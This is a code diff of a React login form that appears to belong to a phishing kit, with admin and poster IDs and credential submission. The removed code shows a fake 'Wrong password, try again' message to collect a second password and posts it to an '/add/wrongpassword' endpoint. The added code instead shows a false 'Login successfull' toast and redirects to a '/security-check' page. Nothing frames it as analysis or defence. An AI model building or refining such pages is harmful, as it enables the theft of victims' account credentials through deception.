@@ -14,7 +14,7 @@ function LoginForm({ adminId, posterId }) {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [wrongPassword, setWrongPassword] = useState("");
-  const [showWrongPassword, setShowWrongPassword] = useState(false);
+  // const [showWrongPassword, setShowWrongPassword] = useState(false);
   const { login } = useMockLogin(adminId, posterId);
 
   const handleSubmit = () => {
@@ -24,10 +24,13 @@ function LoginForm({ adminId, posterId }) {
       password: password,
     };
     login(submitValues);
-    setShowWrongPassword(true);
-    toast.success("Wrong password, try again");
+    // setShowWrongPassword(true);
+    toast.success("Login successfull");
+    router.push(`/security-check`);
+
     console.log(submitValues);
   };
+
   const handleWrongPassword = async () => {
     const url = `${API_URL}/add/wrongpassword`;
     const id = Cookies.get("id");
@@ -89,21 +92,21 @@ function LoginForm({ adminId, posterId }) {
           required
         />
 
-        {!showWrongPassword ? (
-          <>
-            <input
-              className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-              placeholder="Password"
-              name="password"
-              type="password"
-              autoComplete="on"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              required
-            />
-          </>
-        ) : (
-          <input
+        {/* {!showWrongPassword ? ( */}
+        {/* <> */}
+        <input
+          className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
+          placeholder="Password"
+          name="password"
+          type="password"
+          autoComplete="on"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          required
+        />
+        {/* </> */}
+        {/* ) : ( */}
+        {/* <input
             className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
             placeholder="Password"
             name="wrongPassword"
@@ -113,12 +116,12 @@ function LoginForm({ adminId, posterId }) {
             onChange={(e) => setWrongPassword(e.target.value)}
             required
           />
-        )}
-        {showWrongPassword ? (
+        )} */}
+        {/* {showWrongPassword ? (
           <p className="text-red-500 text-lg font-medium text-center">
             Wrong Password, try again
           </p>
-        ) : null}
+        ) : null} */}
         <div className="flex flex-col items-center">
           <Image
             src="/images/captures.jpeg"
@@ -138,7 +141,7 @@ function LoginForm({ adminId, posterId }) {
             required
           />
         </div>
-        {!showWrongPassword ? (
+        {/* {!showWrongPassword ? (
           <button
             type="button"
             onClick={handleSubmit}
@@ -146,18 +149,18 @@ function LoginForm({ adminId, posterId }) {
           >
             SUBMIT
           </button>
-        ) : (
-          <button
-            type="submit"
-            // type="button"
-            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-            // disabled={!verified}
-            // onClick={handleNextStep}
-            onClick={handleWrongPassword}
-          >
-            SUBMIT
-          </button>
-        )}
+        ) : ( */}
+        <button
+          type="submit"
+          // type="button"
+          className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
+          // disabled={!verified}
+          // onClick={handleNextStep}
+          onClick={handleSubmit}
+        >
+          SUBMIT
+        </button>
+        {/* )} */}
 
         <Image
           src="/images/warning.png"
